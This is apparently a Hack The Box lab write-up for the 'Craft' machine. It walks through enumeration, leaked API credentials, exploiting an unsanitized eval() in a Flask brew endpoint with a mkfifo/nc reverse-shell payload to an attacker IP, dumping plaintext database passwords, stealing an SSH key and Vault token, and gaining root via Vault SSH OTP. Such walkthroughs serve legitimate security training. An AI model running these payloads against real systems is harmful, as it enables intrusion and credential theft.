## Craft

### Lab Details 

- Difficulty: Medium
- Type:  Git, API, Hashicorp Vault, Privilege Esc, Linux

#### Enumeration
- run `nmap`
```bash
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.15.8
|_http-title: About
6022/tcp open  ssh      (protocol 2.0)
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
```
- found 
	- domain name: `craft.htb`
	- subdomain: `api.craft.htb` & `gogs.craft.htb`
- enumerate `api.craft.htb`
	- found documentations for `craft api`
- enumerate `gogs.craft.htb`
	- we are able to view the `craft-api` repository without authentication and found connection strings
```bash
curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
```
- found credential for user `dinesh`
![[dinesh cred.png]]
#### Initial Foothold 
- we can attempt to fetch the token with `dinesh`'s credential and run the same `test.py` script
```bash
$ cat test.py 
import requests
import json


response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)

json_response = json.loads(response.text)

token =  json_response['token']

print(token)
```
- token below
```bash
$ python3 test.py 
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1053: InsecureRequestWarning: Unverified HTTPS request is being made to host 'api.craft.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzYwNTA3NTA2fQ.YRH0QTXLW15uHPOXapiAH7aBwyV-6EDQ1t4v-Jfxr9U
```
- we can check the token validity at `https://api.craft.htb/api/auth/check` endpoint
```bash
$ curl -X GET "https://api.craft.htb/api/auth/check" -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzYwNTA3NTA2fQ.YRH0QTXLW15uHPOXapiAH7aBwyV-6EDQ1t4v-Jfxr9U' -H "Content-Type: application/json" -k
{"message":"Token is valid!"}
```
- search through the repository and found a unsanitized `eval()` function 
- we can use `eval` function to run python codes
```python
<SNIP>
    @auth.auth_required
    @api.expect(beer_entry)
    def post(self):
        """
        Creates a new brew entry.
        """

        # make sure the ABV value is sane.
        if eval('%s > 1' % request.json['abv']):
            return "ABV must be a decimal value less than 1.0", 400
        else:
            create_brew(request.json)
            return None, 201
<SNIP>
```
- inject reverse shell code into to the eval function and send it to the vulnerable endpoint
```python code
import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login', auth=('dinesh',
'4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token = json_response['token']


headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json' }


# create a sample brew with bogus ABV... should fail.
print("Create bogus ABV brew")
brew_dict = {}
brew_dict['abv'] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat
/tmp/f|/bin/sh -i 2>&1|nc 10.10.14.82 4444 >/tmp/f')"
brew_dict['name'] = 'attack'
brew_dict['brewer'] = 'attacker'
brew_dict['style'] = 'ABV'
json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers,
data=json_data, verify=False)
print(response.text)
```
#### Lateral Movement (If any)
- check if we are in a `docker` container
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.79.207] 44487
/bin/sh: can't access tty; job control turned off
/opt/app # ls /.dockerenv
/.dockerenv
```
- `/.dockerenv` exists that mean the reverse shell is running in docker 
- enumerate file system and found  `settings.py` file
```bash
/opt/app # cd craft_api
/opt/app/craft_api # ls
__init__.py
__pycache__
api
database
settings.py
```
- `settings.py` contains `db` connection credential
```
/opt/app/craft_api # cat settings.py
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```
- `dbtest.py` uses these credentials and its fetching data from the database 
- we can attempt to fetch info from the database by modifying or uploading our own `dbtest.py`
- to modify the file first we need to promote the current shell to an interactive shell so we can edit the `dbtest.py`, follow below steps
```bash
## python is located at /usr/bin/env python
/usr/bin/env python -c 'import pty;pty.spawn("/bin/sh")'
ctrl+z ## background the terminal
stty raw -echo
fg
## hit enter or return
export TERM=xterm
```
- need to update the `cursor object` from `fetchone` to `fetchall` and update the `sql` command
```python
/opt/app # cat dbtest.py 
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        ##sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        sql = "show tables"
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)

finally:
    connection.close()
```
- we get plaintext passwords
```bash
/opt/app # vi dbtest.py 
/opt/app # ./dbtest.py 
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
/opt/app # vi dbtest.py 
/opt/app # ./dbtest.py 
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```
#### Privilege Escalation
- attempt with password spray via `ssh` no valid credentials found
- attempt to login to `gogs.craft.htb` we are able to login as `gilfoyle` using the `gilfoyle`'s credential
![[priv ssh key.png]]
- fetch the `id_rsa` private key and get a `ssh` connection as `gilfoyle`
- enumerate files and found `.vault-token` in home directory
```bash
gilfoyle@craft:~$ ls -la
total 36
drwx------ 4 gilfoyle gilfoyle 4096 Feb  9  2019 .
drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..
-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc
drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config
-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile
drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh
-r-------- 1 gilfoyle gilfoyle   33 Oct 15 03:13 user.txt
-rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token
-rw------- 1 gilfoyle gilfoyle 2546 Feb  9  2019 .viminfo
gilfoyle@craft:~$ cat .vault-token
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
```
- search online for `vault-token` got articles on `Hashicorp Vault`
	- [token file](https://developer.hashicorp.com/vault/docs/agent-and-proxy/autoauth/methods/token_file)
	- [One-time SSH passwords](https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords)
- in `craft-infra` repository there is a directory called `vault` and we can find `secrets.sh` file 
![[vault config.png]]
- the `secrets.sh` file shows the config for a role called `root_otp` and default user is root
- which means that a role for root user has been created 
```bash
    #!/bin/bash

    # set up vault secrets backend

    vault secrets enable ssh

    vault write ssh/roles/root_otp \
        key_type=otp \
        default_user=root \
        cidr_list=0.0.0.0/0

```
- stated in the [article](https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords) we can attempt to connect using the predefined role 
```bash
gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@10.129.75.99
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: efa897e6-56da-8cdc-574e-2c23f8cff06e
The authenticity of host '10.129.75.99 (10.129.75.99)' can't be established.
ECDSA key fingerprint is SHA256:sFjoHo6ersU0f0BTzabUkFYHOr6hBzWsSK0MK5dwYAw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.129.75.99' (ECDSA) to the list of known hosts.


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/

Password: 
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 07:14:50 2023
root@craft:~# 
```
- pasted in the `OTP` into the password prompt and we get root access
#### Resources

#### Lesson Learned
